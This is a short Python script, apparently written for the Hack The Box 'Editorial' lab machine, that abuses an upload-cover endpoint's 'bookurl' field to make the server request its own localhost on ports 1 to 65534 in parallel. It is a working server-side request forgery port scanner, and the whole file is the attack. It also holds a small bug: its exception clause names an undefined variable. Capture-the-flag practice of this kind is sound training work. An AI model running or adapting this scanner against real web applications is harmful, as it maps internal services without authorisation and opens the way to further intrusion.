#!/bin/python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def scanWeb(port: int) -> tuple[bool,int]:
    with open("a","rb") as file:
        data_file = {"bookfile":file}
        data_post = {"bookurl":f"http://localhost:{port}"}
        try:
            r = requests.post("http://editorial.htb/upload-cover",files=data_file,data=data_post)
            if not r.text.strip().endswith(".jpeg"):
                return True,port
        except ex:
            pass
    return False,port


with open("a","wb") as f:
    f.write(b'')

with ThreadPoolExecutor(max_workers=50) as ex:
    fetures = [ex.submit(scanWeb,port) for port in range(1,65535)]
    for fu in as_completed(fetures):
        ok,port = fu.result()
        if ok:
            print(f"{port}")